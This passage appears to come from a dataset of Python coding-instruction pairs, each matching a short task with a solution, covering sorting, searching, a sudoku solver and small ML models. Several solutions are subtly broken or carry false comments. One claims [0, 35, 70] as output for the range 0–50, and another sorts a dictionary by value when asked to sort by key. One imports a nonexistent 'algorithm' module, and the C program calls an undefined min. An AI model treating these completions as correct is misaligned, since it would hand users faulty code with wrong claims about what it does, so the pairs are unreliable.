2.0 (the \\"License\\") # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an \\"AS IS\\" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # class techsupport_args : \\"\\"\\" Provides additional arguments required for fetching the techsupport resource. \\"\\"\\" def __init__(self) : self._scope = \\"\\" @property def scope(self) : \\"\\"\\"Use this option to run showtechsupport on present node or all cluster nodes.<br/>Default value: NODE<br/>Possible values = NODE, CLUSTER. \\"\\"\\" try : return self._scope except Exception as e: raise e @scope.setter def scope(self, scope) : \\"\\"\\"Use this option to run showtechsupport on present node or all cluster nodes.<br/>Default value: NODE<br/>Possible values = NODE, CLUSTER \\"\\"\\" try : self._scope = scope except Exception as e: raise e class Scope: NODE = \\"NODE\\" CLUSTER = \\"CLUSTER\\""},{"prompt":"Generate a Python program to remove all the elements equal to the given target from an array. [2, 3, 4, 3, 5, 3], target: 3","completion":"def remove_target(arr, target): result = [] for num in arr: if num != target: result.append(num) return result"},{"prompt":"Write a function to perform an HTTP request using Python.","completion":"import requests def http_request(url): response = requests.get(url) if response.status_code == 200: return response.text else: return None http_result = http_request('https://www.example.com/')"},{"prompt":"Create a function in Python to check the length of the longest increasing subsequence in a given array. [1, 3, 5, 4, 7]","completion":"def longestIncreasingSubsequence(arr): n = len(arr) lis = [1]*n for i in range (1 , n): for j in range(0 , i): if arr[i] > arr[j] and lis[i]< lis[j] + 1 : lis[i] = lis[j]+1 maximum = 0 for i in range(n): maximum = max(maximum , lis[i]) return maximum arr = [1, 3, 5, 4, 7] res = longestIncreasingSubsequence(arr); print(res)"},{"prompt":"Calculate the factorial of a given number using a Python program.","completion":"def factorial(n): if n == 0: return 1 else: return n * factorial(n-1)"},{"prompt":"Write a Python program to find all the numbers divisible by 7 and multiple of 5 between a given range. The range is from 0 and 50.","completion":"# Find all numbers divisible by 7 and multiple of 5 between 0 and 50 # Create an empty list result = [] # Loop through the range for i in range(0, 51): # Check if number is divisible by 7 and multiple of 5 if (i % 7 == 0) and (i % 5 == 0): # Add the number to the list result.append(i) # Print the list print(result) # Output: [0, 35, 70]"},{"prompt":"Create an Python program that takes a list of words as input and prints out the longest word. words = [cat, dog, elephant, rhinoceros]","completion":"words = [\\"cat\\", \\"dog\\", \\"elephant\\", \\"rhinoceros\\"] def longest_word(words): longest_word = \\"\\" for word in words: if len(longest_word) < len(word): longest_word = word print(longest_word) longest_word(words)"},{"prompt":"Design a program to calculate the sum of two integers in Python.","completion":"def sum_two_ints(a, b): return a + b"},{"prompt":"Write a python script to print out every possible combination of letters given a list of characters [a, b, c]","completion":"from itertools import product # Create a function to generate every possible combination def generate_combinations(chars): for combination in product(*chars): combination = \\"\\".join(combination) print(combination) # Input list of characters chars = [\\"a\\",\\"b\\",\\"c\\"] # Generate all combinations generate_combinations(chars)"},{"prompt":"Create a function in Python to sort strings in alphabetical order. ['abc', 'bac', 'bca', 'axy', 'axz']","completion":"def sort_strings(strings): strings.sort() return strings strings = ['abc', 'bac', 'bca', 'axy', 'axz'] print(sort_strings(strings))"},{"prompt":"Develop a ML algorithm in Python which can classify whether a given email is Spam or NotSpam. not_spam_emails = [Hello, how are you?, The meeting is tomorrow at 3PM, We need to discuss the project report] spam_emails = [Click here for great offers!, You have won a free gift!, Take advantage of our special discounts today!]","completion":"# Importing necessary libraries import pandas as pd from sklearn.feature_extraction.text import CountVectorizer # Create a dataframe df = pd.DataFrame({'Email':not_spam_emails + spam_emails, 'label':['not_spam', 'not_spam', 'not_spam', 'spam', 'spam', 'spam']}) # Feature extraction cv = CountVectorizer() X = cv.fit_transform(df['Email']) # Split the data from sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test = train_test_split(X, df['label'], test_size=0.33, random_state=42) # Create model from sklearn.naive_bayes import MultinomialNB clf = MultinomialNB() clf.fit(X_train, y_train) # Predict the results y_pred = clf.predict(X_test) # Calculate accuracy from sklearn.metrics import accuracy_score print(accuracy_score(y_test, y_pred))"},{"prompt":"Create a code generator that takes a Python program and reduces its memory footprint by using less memory to store data. x = 20 y = 50 z = x + y print(z)","completion":"num1 = 20 num2 = 50 result = num1 + num2 print(result)"},{"prompt":"Construct a function in Python to remove a given value from a list of integers. [5, 7, 6, 1, 3], 3","completion":"def remove_element(list, element): for i in list: if i == element: list.remove(i) return list list = [5, 7, 6, 1, 3] element = 3 print(remove_element(list, element)) # => [5, 7, 6, 1]"},{"prompt":"Create an algorithm in Python to determine whether a given string is a palindrome.","completion":"# define a function to check if a string is a palindrome def is_palindrome(string): # reverse the string reversed_string = string[::-1] # check if reversed string is equal to original if string == reversed_string: return True else: return False # check for given string string = 'malayalam' if is_palindrome(string): print(string + ' is a palindrome') else: print(string + ' is not a palindrome')"},{"prompt":"Create a Python program to generate strings of random alphabets. Not applicable","completion":"import random def generator(length): alphabets = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' return ''.join(random.choice(alphabets) for i in range(length)) print(generator(10))"},{"prompt":"Create a Python program to filter a list of names by the length of their name. The output should be a new list containing only names with lengths equal to 10 characters. names = ['Johanna', 'George', 'John', 'Bobby', 'Steven']","completion":"def filter_names(names): filtered = [] for name in names: if len(name) == 10: filtered.append(name) return filtered names = ['Johanna', 'George', 'John', 'Bobby', 'Steven'] filtered = filter_names(names) print(filtered) # ['Johanna', 'Steven']"},{"prompt":"Write a Python function that takes a string as input and returns true if the string starts with the letter a. String: awesome","completion":"def starts_with_a(string): if string[0] == 'a': return True else: return False result = starts_with_a('awesome') print(result)"},{"prompt":"Create a python program to accept two inputs from the user, a number and a string, and print the string the given number of times. 3, Hello","completion":"num = int(input(\\"Enter a number: \\")) string = input(\\"Enter a string: \\") for i in range(num): print(string)"},{"prompt":"Generate Python code for a linear regression model. The model should take two numerical inputs, x and y, and be able to predict the numerical output that best fits the given data. x: [1, 2, 3] y: [3, 6, 9]","completion":"import numpy as np x = np.array([1, 2, 3]) y = np.array([3, 6, 9]) # Create the design matrix X = np.vstack([np.ones(len(x)), x]).T # Calculate the weights w = np.linalg.inv(X.T.dot(X)).dot(X.T).dot(y) # Predicted output y_pred = X.dot(w)"},{"prompt":"Create a vector addition program in Python.","completion":"def vector_add(a, b): c = [] for i in range(len(a)): c.append(a[i] + b[i]) return c"},{"prompt":"Create an algorithm in Python using the algorithm library for finding the greatest common divisor between two numbers. Not applicable","completion":"import algorithm def gcd(a, b): a, b = max(a, b), min(a, b) if a % b == 0: return b else: return gcd(b, a % b)"},{"prompt":"Write a function in Python to sort the given list of strings based on the length of the words in ascending order. [apple, mango, banana, cherry]","completion":"def sort_by_word_length(word_list): \\"\\"\\" Function to sort a given list of strings based on the length of the words in ascending order. @param word_list: list @return: list \\"\\"\\" return sorted(word_list, key=lambda x: len(x))"},{"prompt":"Write a Python program to find the closest pair of points in a given set of points. [[2, 3], [12, 30], [40, 50], [5, 1], [12, 10], [3, 4]]","completion":"import math def closest_pair(points): closest_pair = None closest_distance = float('inf') for i in range(len(points)): for j in range(i + 1, len(points)): distance = calc_distance(points[i], points[j]) if distance < closest_distance: closest_distance = distance closest_pair = (points[i], points[j]) return closest_pair, closest_distance def calc_distance(p1, p2): return math.sqrt((p2[0] - p1[0])**2 + (p2[1] - p1[1])**2) points = [[2, 3], [12, 30], [40, 50], [5, 1], [12, 10], [3, 4]] closest_pair, closest_distance = closest_pair(points) print(closest_pair) # prints ([2, 3], [3, 4]) print(closest_distance) # prints 1.0"},{"prompt":"Write a code in Python to sort a list of integers with the following conditions: Numbers greater than zero should be sorted in ascending order. Numbers equal to zero should remain unchanged. Numbers less than zero should be sorted in descending order. [2, 7, 0, 8, 3]","completion":"def sort_list(numbers): result = [] positive_numbers = [] negative_numbers = [] #separate negative and positive numbers for i in numbers: if i > 0: positive_numbers.append(i) elif i < 0: negative_numbers.append(i) else: result.append(i) #sort the positive numbers positive_numbers.sort() #sort the negative numbers in descending order negative_numbers.sort(reverse=True) #concatenate all of the separate lists result += positive_numbers result += negative_numbers return result"},{"prompt":"Write a Python program that takes a list of numbers and lists all the prime numbers in the list. [4, 8, 11, 13]","completion":"[11, 13]"},{"prompt":"Generate a Python program to find the nearest prime number greater than an inputted number 26","completion":"#import libraries import sympy # define the input num = 26 # set the flag to True flag = True # check for prime numbers while flag: num += 1 if sympy.isprime(num): flag = False # print the output print(num)"},{"prompt":"Generate a class in Python to represent a deck of cards.","completion":"import random class Deck(): CARDS = [ 'Ace of Spades', 'Two of Spades', 'Three of Spades', 'Four of Spades', 'Five of Spades', 'Six of Spades', 'Seven of Spades', 'Eight of Spades', 'Nine of Spades', 'Ten of Spades', 'Jack of Spades', 'Queen of Spades', 'King of Spades', 'Ace of Hearts', 'Two of Hearts', 'Three of Hearts', 'Four of Hearts', 'Five of Hearts', 'Six of Hearts', 'Seven of Hearts', 'Eight of Hearts', 'Nine of Hearts', 'Ten of Hearts', 'Jack of Hearts', 'Queen of Hearts', 'King of Hearts', 'Ace of Clubs', 'Two of Clubs', 'Three of Clubs', 'Four of Clubs', 'Five of Clubs', 'Six of Clubs', 'Seven of Clubs', 'Eight of Clubs', 'Nine of Clubs', 'Ten of Clubs', 'Jack of Clubs', 'Queen of Clubs', 'King of Clubs', 'Ace of Diamonds', 'Two of Diamonds', 'Three of Diamonds', 'Four of Diamonds', 'Five of Diamonds', 'Six of Diamonds', 'Seven of Diamonds', 'Eight of Diamonds', 'Nine of Diamonds', 'Ten of Diamonds', 'Jack of Diamonds', 'Queen of Diamonds', 'King of Diamonds' ] def __init__(self): self._cards = Deck.CARDS.copy() def draw_card(self): return random.choice(self._cards) def remove_card(self, card): self._cards.remove(card)"},{"prompt":"Create a search algorithm that searches for a given string in a given list of strings lst = ['remote', 'deliver', 'python', 'code'] str = 'python'","completion":"def linear_search(lst, str): for i in range(0, len(lst)): if lst[i] == str: return i return -1 lst = ['remote', 'deliver', 'python', 'code'] str = 'python' result = linear_search(lst, str) if result != -1: print (\\"Element is present at index\\", result) else: print (\\"Element is not present in list\\")"},{"prompt":"Create a Python function that takes a string and rotates the characters in the string by a specified integer. Hello, 3","completion":"def rotateString(s, n): output = \\"\\" for char in s: output += chr(ord(char) + n) return output result = rotateString(\\"Hello\\", 3) print(result)"},{"prompt":"Write a Python program to combine two lists by alternating elements list1 = [11, 22, 33] list2 = [1, 2, 3]","completion":"def combine_list(list1, list2): combined_list = [] for i in range(max(len(list1), len(list2))): if i < len(list1): combined_list.append(list1[i]) if i < len(list2): combined_list.append(list2[i]) return combined_list"},{"prompt":"Write a Python program to generate a random password containing at least one special character and one numeric character. Not applicable","completion":"import string import random characters = string.ascii_letters + string.digits + string.punctuation # Generates a random password of length 8 password = \\"\\".join(random.sample(characters, 8)) # Checks if password has at least one special character # and one numeric character if any(char.isdigit() for char in password) and any(char in string.punctuation for char in password): print(password) else: print(\\"Retry!\\")"},{"prompt":"Design a program in Python to find the roots of a quadratic equation.","completion":"import math def find_roots(a, b, c): # calculate the discriminant d = (b**2) - (4*a*c) # calculate the two solutions to the equation sol1 = (-b-math.sqrt(d))/(2*a) sol2 = (-b+math.sqrt(d))/(2*a) # return the two solutions return sol1, sol2"},{"prompt":"Design an efficient algorithm using NGrams in Python for automatically summarizing a text document. Not applicable","completion":"import nltk def generate_ngrams(text, n): lst = text.split() ngrams = [] for i in range(len(lst)-n+1): ngrams.append(' '.join(lst[i:i+n])) return ngrams def generate_summary(text, n): freq_table = {} for ngram in generate_ngrams(text, n): if ngram in freq_table: freq_table[ngram] += 1 else: freq_table[ngram] = 1 sorted_freq_table = sorted(freq_table.items(), key=lambda x: x[1], reverse=True) summary = '' for (ngram, count) in sorted_freq_table[:3]: summary += ngram + ' ' return summary text = 'Text document summarization is the process of reducing a text document with a computer program in order to create a summary that retains the most important points of the original document.' summary = generate_summary(text, 2) print(summary) # Output: Text document summarization original document."},{"prompt":"Write a Python program to identify the most common words used in a list of text strings. the quick brown fox; jumped over the lazy dog","completion":"from collections import Counter input_strings = [] input_string = \\"the quick brown fox\\" input_strings.append(input_string) input_string = \\"jumped over the lazy dog\\" input_strings.append(input_string) words = [] for input_string in input_strings: words.extend(input_string.split(\\" \\")) word_counts = Counter(words) most_common_words = word_counts.most_common() print(\\"The most common words are:\\") for word, count in most_common_words: print(f\\"{word} ({count})\\")"},{"prompt":"Develop an algorithm using Python to optimize the following path planning problem: A robot is placed on an 8x8 grid and needs to find the shortest path to get from point A to point B. The 8x8 grid has obstacles located at (1,1), (3,4), (6,4), (7,7).","completion":"import collections # initialize the queue Q = collections.deque() # add point A to the queue Q.append((0, 0)) # create a list to hold visited points visited = [] # create the map of the grid grid = [[0, 0, 0, 0, 0, 0, 0, 0], [0, 1, 0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 1, 0, 0, 0], [0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 1, 0, 0, 0, 0, 0], [0, 0, 0, 0, 1, 0, 0, 0], [0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0, 1, 0]] # start the breadth-first search while Q: # get the next point in the queue x, y = Q.popleft() # mark the point as visited visited.append((x, y)) # check if point B has been reached if (x, y) == (7, 7): break # otherwise, explore its neighbors if x < 7 and grid[x+1][y] == 0 and (x+1, y) not in visited: Q.append((x+1, y)) if y < 7 and grid[x][y+1] == 0 and (x, y+1) not in visited: Q.append((x, y+1)) if x > 0 and grid[x-1][y] == 0 and (x-1, y) not in visited: Q.append((x-1, y)) if y > 0 and grid[x][y-1] == 0 and (x, y-1) not in visited: Q.append((x, y-1)) # the result is a list of points which make up the path print(visited)"},{"prompt":"Develop a python code to evaluate the sum of all the even numbers in a given sequence.","completion":"def sum_even_numbers(sequence): result = 0 for num in sequence: if num % 2 == 0: result += num return result"},{"prompt":"Collect all URLs from a webpage and store them in a database using Python, Beautiful Soup, and SQLite. URL: https://example.com/","completion":"import requests from bs4 import BeautifulSoup import sqlite3 url = \\"https://example.com/\\" resp = requests.get(url) soup = BeautifulSoup(resp.text, \\"html.parser\\") links = soup.find_all('a', href=True) conn = sqlite3.connect(\\"urls.db\\") c = conn.cursor() try: c.execute('''CREATE TABLE urls (url TEXT)''') except: pass for link in links: c.execute(\\"INSERT INTO urls VALUES (?)\\", (link['href'],)) conn.commit() conn.close()"},{"prompt":"Create a Python program to sort the values of a given dictionary in descending order based on their keys. {'a':5, 'b':2, 'c':4, 'd':1}","completion":"def sort_dict(d): sorted_dict = {key:value for key, value in sorted(d.items(), key=lambda x: x[1], reverse=True)} return sorted_dict"},{"prompt":"Write a python program to classify the given input into two categories Input: Apple","completion":"def classify(input): if input == \\"apple\\": label = \\"fruit\\" else: label = \\"not fruit\\" return label"},{"prompt":"Create a function in Python that takes two strings as input and returns their concatenated string. Hello, World","completion":"def concat_strings(str1, str2): return str1 + str2 result = concat_strings(\\"Hello\\", \\"World\\") print(result)"},{"prompt":"Design a data structure in Python that stores customer data such as customer ID and payment history.","completion":"class Customer: def __init__(self, customer_id, payments): self.customer_id = customer_id self.payments = payments # Sample usage customers = [] customers.append(Customer(1, [50, 100, 150])) customers.append(Customer(2, [75, 125, 175]))"},{"prompt":"Create an algorithm in Python to sort a sequence of numbers in nondecreasing order. [1, 3, 5, 4, 2, 0, 9]","completion":"def insertion_sort(seq): for i in range(1, len(seq)): j = i-1 key = seq[i] while (seq[j] > key) and (j >= 0): seq[j+1] = seq[j] j -= 1 seq[j+1] = key seq = [1, 3, 5, 4, 2, 0, 9] insertion_sort(seq) print(seq) # Output: [0, 1, 2, 3, 4, 5, 9]"},{"prompt":"Create a Python Program to sort a list of strings according to the length of their elements. list = [apple, cat, banana, dog]","completion":"def ascending_sort(list): list.sort(key=len) return list list = [\\"apple\\", \\"cat\\", \\"banana\\", \\"dog\\"] result = ascending_sort(list) print(result)"},{"prompt":"Solve this basic algebra problem in Python. 5x 4 = 35","completion":"x = (35 + 4)/5"},{"prompt":"Develop a program in Python to extract the substring between two given strings input_string = This is an example string start_string = an end_string = string","completion":"import re input_string = \\"This is an example string\\" start_string = \\"an\\" end_string = \\"string\\" regex = re.compile(start_string + '(.*?)' + end_string) result = re.search(regex, input_string) if result: print(result.group(1))"},{"prompt":"Generate a python program to read 10 numbers and store their sum in a variable.","completion":"sum = 0 for i in range(10): num = int(input(\\"Input number: \\")) sum += num print(\\"Sum:\\", sum)"},{"prompt":"Write a python program to represent the given data using a tree structure. [{'name': 'John', 'age': 20}, {'name': 'David', 'age': 26}, {'name': 'Adam', 'age': 16}, {'name': 'Stephen', 'age': 35}]","completion":"def create_tree(data): tree = { 'age': None, 'children': [] } for d in data: node = { 'age': d['age'], 'name': d['name'], 'children': [] } tree['children'].append(node) return tree"},{"prompt":"Write a Python program to generate random numbers from 1 to 5 using the random library. Not applicable","completion":"import random for _ in range(10): print(random.randint(1, 5))"},{"prompt":"Write an algorithm in Python to convert an infix expression to pre fix expression. expression = (A B/C)*(A/KL)","completion":"# Function to convert infix expression to prefix expression def infixToPrefix(infix): # Transform the infix expression to reverse polish notation postfix = infixToPostfix(infix) # Reverse the postfix expression reversePostfix = reverseString(postfix) return reversePostfix # Function to convert infix expression to postfix expression def infixToPostfix(infix): # precedence of the operators operatorPrecedence = {'+':1, '-':1, '*':2, '/':2, '^':3} # stack to store operators stack = [] # postfix expression postfix = \\"\\" # loop throught the infix expression for char in infix: # if character is an operand if char.isalpha(): postfix += char # if character is an opening bracket elif char == '(': stack.append(char) # if character is a closing bracket elif char == ')': # loop until the opening bracket while len(stack) > 0 and stack[-1] != '(': postfix += stack.pop() # pop the opening bracket from the stack stack.pop() # if character is an operator else: # loop until the stack is empty, or the element # at the top has a lower precedence than # the operator while len(stack) > 0 and operatorPrecedence[stack[-1]] >= operatorPrecedence[char]: postfix += stack.pop() # append the current character to the stack stack.append(char) # append remaining operators to the stack while len(stack) > 0: postfix += stack.pop() return postfix # Helper function to reverse a string def reverseString(string): return string[::-1] # Driver program if __name__ == '__main__': infixExpression = \\"(A - B/C) * (A/K-L)\\" prefixExpression = infixToPrefix(infixExpression) print(prefixExpression)"},{"prompt":"Design a Python script to scrape a website for data related to a given keyword. keyword: Artificial Intelligence","completion":"import requests from bs4 import BeautifulSoup # Define target website and keyword url = 'http://example.net' keyword = 'Artificial Intelligence' # Send request to server and fetch the response response = requests.get(url) if response.status_code == 200: # Parse HTML and extract the desired data html_doc = response.text soup = BeautifulSoup(html_doc, 'html.parser') results = soup.find_all(text=keyword) print(results)"},{"prompt":"Create a Python script for encrypting and decrypting data using Advanced Encryption Standard (AES). Not applicable","completion":"from Crypto.Cipher import AES def encrypt(plaintext, key): cipher = AES.new(key, AES.MODE_EAX) ciphertext = cipher.encrypt(plaintext) # Return a tuple containing the nonce and the cipher text return (cipher.nonce, ciphertext) def decrypt(nonce, ciphertext, key): cipher = AES.new(key, AES.MODE_EAX, nonce=nonce) plaintext = cipher.decrypt(ciphertext) return plaintext"},{"prompt":"Create a program in Python that will optimize the function y = x^2 4x + 1. Upper and lower bounds of 0 and 10","completion":"# Importing NumPy module import numpy as np # Defining the function def f(x): return x**2 - 4*x + 1 # Defining the optimization function def optimize(f, lower, upper): # Initializing the solution best_x = 0 best_y = 1000 # Finding the best solution in the bounded region for x in np.arange(lower, upper, 0.01): y = f(x) if y <= best_y: best_y = y best_x = x return (best_x, best_y) # Driver code lower = 0 upper = 10 local_minima = optimize(f, lower, upper) # Printing the solution print(\\"The value of x is\\", local_minima[0]) print(\\"The value of y is\\", local_minima[1])"},{"prompt":"Can you form a mathematical expression in Python to calculate the total area of a circle and a square?","completion":"# Calculate total area of circle and square import math radius = 4 side = 5 circle_area = math.pi * radius**2 square_area = side**2 total_area = circle_area + square_area print(\\"Total area of the circle and square:\\", total_area)"},{"prompt":"Write a Python program that carries out the following tasks. The program should take two strings as parameters and return a new string that contains the two inputs merged together. Input 1: Hello Input 2: World","completion":"def mergeStrings(str1, str2): return str1 + str2 print(mergeStrings('Hello', 'World'))"},{"prompt":"Create a function in Python for evaluating a given polynomial expression. Expression: 4x4 + 7x3 + 5x2 + 8x","completion":"def evaluate_polynomial(expression): expression = expression.strip() tokens = expression.split(\\"+\\") result = 0 for term in tokens: term = term.strip() coefficient, exponent = term.split(\\"x\\") result += float(coefficient) * float(expoent) return result"},{"prompt":"Edit the script to print out the number of times each letter appears in the given sentence. We are learning Pytho","completion":"\\"\\"\\"Edit the script to print out the number of times each letter appears in the given sentence.\\"\\"\\" sentence = 'We are learning Python' # Create an empty dictionary letter_freq = {} # Iterate through the sentence for c in sentence: # If the character is a letter if c.isalpha(): # Increment the frequency in the dictionary letter_freq[c] = letter_freq.setdefault(c, 0) + 1 # Print out the frequency of each letter for letter, freq in letter_freq.items(): print('{}: {}'.format(letter, freq))"},{"prompt":"Write code in Python to generate all the possible permutations of a given list. list = [1,2,3]","completion":"import itertools def permute(list): return list(itertools.permutations(list))"},{"prompt":"Generate a Python function that takes in a list of words and returns the length of the longest word. ['Ram', 'Shyam', 'Mohan']","completion":"def longest_word_length(words): length = 0 for word in words: if len(word) > length: length = len(word) return length"},{"prompt":"Generate a Markov chain model that can generate text. This model should be able to generate realistic natural language sentences when given an input text. Not applicable","completion":"from markov_python.cc_markov import MarkovChain #Creating a Markov Chain mc = MarkovChain() # Generate text text_file = open('input.txt', 'r') mc.add_file(text_file) print(mc.generate_text())"},{"prompt":"Setup a Django server that can host a website.","completion":"# Install Django if it does not already exist pip install django # Start a new project django-admin startproject myproject # Create and apply migrations cd myproject python manage.py makemigrations python manage.py migrate # Start the server python manage.py runserver 0:8000"},{"prompt":"Write a Python program to search for a given element in a list.","completion":"def search_element(element, list_): for i in range(len(list_)): if element == list_[i]: return i return -1"},{"prompt":"Design an algorithm in Python that will accept an array of integers and return an array with alternate elements removed starting from the even indices. [1, 2, 3, 4, 5, 6]","completion":"def alternating_elements(arr): new_arr = [arr[i] for i in range(0, len(arr), 2)] return new_arr result = alternating_elements([1, 2, 3, 4, 5, 6]) print(result) #[2, 4, 6]"},{"prompt":"Write a python program to extract text data from a PDF document. Not applicable","completion":"import PyPDF2 # Load file file= open(your_pdf_filename, 'rb') reader= PyPDF2.PdfFileReader(file) # Read text text = '' for page in reader.pages: text += page.extractText() # Close file file.close() # Print result print(text)"},{"prompt":"Develop a Python program to classify the fashion MNIST dataset by a convolutional neural network.","completion":"from keras.models import Sequential from keras.layers import Conv2D, MaxPooling2D, Dense, Flatten # Create the network model = Sequential() model.add(Conv2D(32, (3, 3), activation=\\"relu\\", input_shape=(28, 28, 1))) model.add(MaxPooling2D(pool_size=(2,2))) model.add(Flatten()) model.add(Dense(10, activation=\\"softmax\\")) # Compile the model model.compile(optimizer=\\"adam\\", loss=\\"categorical_crossentropy\\", metrics=[\\"accuracy\\"])"},{"prompt":"Generate a python program with a class that has both private and public members.","completion":"class Foo: def __init__(self, private_var, public_var): # Private members self.__private_var = private_var # Public members self.public_var = public_var # Private method def __private_method(self): return self.__private_var # Public method def public_method(self): return self.public_var"},{"prompt":"Create a function in Python to print all numbers from N to 1 in reverse order.","completion":"def reverse_print(n): for i in range(n, 0, -1): print(i) n = 5 reverse_print(n)"},{"prompt":"Develop a virtual assistant command in Python to generate a random number between two usersupplied numbers. Minimum number: 10 Maximum number: 20","completion":"import random min_num = int(input(\\"Enter minimum number: \\")) max_num = int(input(\\"Enter maximum number: \\")) print(random.randint(min_num, max_num)) # random number between 10 and 20"},{"prompt":"Write a Python program to generate a password with a given length and characters. length = 10 characters = alphanumeric","completion":"import random def generate_password(length, characters): password = '' for i in range(length): password += random.choice(characters) return password print(generate_password(10, 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'))"},{"prompt":"Write a Python program to compute the sum of the absolute difference of all pairs of numbers in a given array. [5, 8, 10, 15]","completion":"arr = [5, 8, 10, 15] Sum = 0 for i in range(len(arr)): for j in range(len(arr)): if(i != j): Sum += abs(arr[i] - arr[j]) print(Sum)"},{"prompt":"Create a program in Python that takes two parameters, a string and an integer, and returns the string repeated that many times. Hello, 4","completion":"def repeat_string(string, n): repeated_string = string * n return repeated_string print(repeat_string(\\"Hello\\", 4))"},{"prompt":"Given a list of words and a target word, write a Python function to check if the target word exists in the list. Let's say the list is ['apple', 'banana', 'car', 'dog'] and the target word is 'banana'.","completion":"def isElementPresent(list, target): for word in list: if word == target: return True return False wordlist = ['apple', 'banana', 'car', 'dog'] target = 'banana' print(isElementPresent(wordlist, target)) # prints True"},{"prompt":"Write a Python function to generate an efficient sudoku solver. Example sudoku board: [[7,8,0,4,0,0,1,2,0], [6,0,0,0,7,5,0,0,9], [0,0,0,6,0,1,0,7,8], [0,0,7,0,4,0,2,6,0], [0,0,1,0,5,0,9,3,0], [9,0,4,0,6,0,0,0,5], [0,7,0,3,0,0,0,1,2], [1,2,0,0,0,7,4,0,0], [0,4,9,2,0,6,0,0,7]]","completion":"def solve(bo): find = find_empty(bo) if not find: return True else: row, col = find for i in range(1,10): if valid(bo, i, (row, col)): bo[row][col] = i if solve(bo): return True bo[row][col] = 0 return False def valid(bo, num, pos): # Check row for i in range(len(bo[0])): if bo[pos[0]][i] == num and pos[1] != i: return False # Check column for i in range(len(bo)): if bo[i][pos[1]] == num and pos[0] != i: return False # Check box box_x = pos[1] // 3 box_y = pos[0] // 3 for i in range(box_y*3, box_y*3 + 3): for j in range(box_x * 3, box_x*3 + 3): if bo[i][j] == num and (i,j) != pos: return False return True def find_empty(bo): for i in range(len(bo)): for j in range(len(bo[0])): if bo[i][j] == 0: return (i, j) # row, col"},{"prompt":"Write a Python program that reads in a list of numbers and sorts them in the ascending order. [2, 3, 4, 5, 1]","completion":"def sort_list(lst): lst.sort() return lst result = sort_list([2, 3, 4, 5, 1]) print(result)"},{"prompt":"Design a data structure in Python to store details of past purchases of a customer.","completion":"class Purchase: def __init__(self, item_name, purchase_date, quantity): self.item_name = item_name self.purchase_date = purchase_date self.quantity = quantity class Customer: def __init__(self, customer_name): self.customer_name = customer_name self.purchases = [] def add_purchase(self, purchase): self.purchases.append(purchase)"},{"prompt":"Construct a Python program that verifies if the given input number is even or odd.","completion":"# Program checking if the input number is even or odd num = int(input(\\"Please enter a number: \\")) # Check if the number is even or odd if num % 2 == 0: print(str(num) + \\" is an even number.\\") else: print(str(num) + \\" is an odd number.\\")"},{"prompt":"Create a machine learning model in Python with Keras that predicts the number of classes a person belongs to. Not applicable","completion":"import numpy as np import pandas as pd from keras.models import Sequential from keras.layers import Dense data = pd.read_csv('data.csv') X = data.iloc[:, :-1] y = data.iloc[:, -1] model = Sequential() model.add(Dense(units=32, activation='relu', input_dim=X.shape[1])) model.add(Dense(units=1, activation='sigmoid')) model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy']) model.fit(X, y, epochs=200, batch_size=64)"},{"prompt":"Create a program in Python to compare two sentences for similarity. The quick brown fox jumps over the lazy dog The fast brown fox jumps over the lazy fox","completion":"import spacy nlp = spacy.load(\\"en_core_web_lg\\") def compare_sentences(sentence_a, sentence_b): # tokenize the sentences sentence_a_tokens = nlp(sentence_a) sentence_b_tokens = nlp(sentence_b) # compute the similarity score similarity_score = sentence_a_tokens.similarity(sentence_b_tokens) return similarity_score # example: print(compare_sentences(\\"The quick brown fox jumps over the lazy dog\\",\\"The fast brown fox jumps over the lazy fox\\"))"},{"prompt":"Write a Python program to create a 3x3x3 array (3D array) filled with zeros.","completion":"import numpy as np arr = np.zeros((3, 3, 3)) print(arr)"},{"prompt":"Create a C program to calculate the Levenshtein distance of two strings Python, Perl","completion":"#include <stdio.h> #include <string.h> int LevenshteinDistance(char *s1, char *s2) { int s1len, s2len, x, y, lastdiag, olddiag; s1len = strlen(s1); s2len = strlen(s2); unsigned int column[s1len+1]; for (y = 1; y <= s1len; y++) column[y] = y; for (x = 1; x <= s2len; x++) { column[0] = x; for (y = 1, lastdiag = x-1; y <= s1len; y++) { olddiag = column[y]; if (s1[y-1] == s2[x-1]) column[y] = lastdiag; else column[y] = min( column[y] + 1, min(column[y-1] + 1, lastdiag + 2)); lastdiag = olddiag; } } return(column[s1len]); } int main(){ printf (\\"%dn\\", LevenshteinDistance(\\"Python\\", \\"Perl\\")); return 0; }"},{"prompt":"Create a Python program to convert a given date string to a datetime object and return the week number. 20200518","completion":"import datetime def get_week_number(date_string): d = datetime.datetime.strptime(date_string, '%Y-%m-%d') return d.isocalendar()[1] # isocalendar() is used to get the ISO week number"},{"prompt":"Write a python program to implement the linear search algorithm","completion":"def linear_search(arr, key): for i in range(len(arr)): if arr[i] == key: return i return -1"},{"prompt":"Generate a random character string in Python of length 10.","completion":"import random random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))"},{"prompt":"Create a python class Trainer to enable an AI agent to learn.","completion":"class Trainer: def __init__(self): self.data = [] self.model = None def add_data(self, new_data): self.data.append(new_data) def train(self): self.model = Model(self.data) self.model.train() def predict(self, input_data): preds = self.model.predict(input_data) return preds"},{"prompt":"Can you build an application with Python and Flask to handle user and card registration?","completion":"from flask import Flask, render_template, request app = Flask(__name__) @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': user = request.form['username'] card = request.form['card'] # handle user and card registration here # ... return render_template('register.html', success=True) else: return render_template('register.html') if __name__ == '__main__': app.run(debug=True)"},{"prompt":"Write a Python program to create a set from a given list and calculate its intersection, union and difference with another set. list1 = [10, 20, 30, 40] list2 = [30, 40, 50, 60]","completion":"# create set from list set1 = set(list1) set2 = set(list2) # calculate set intersection intersection = set1.intersection(set2) # calculate set union union = set1.union(set2) # calculate set difference difference = 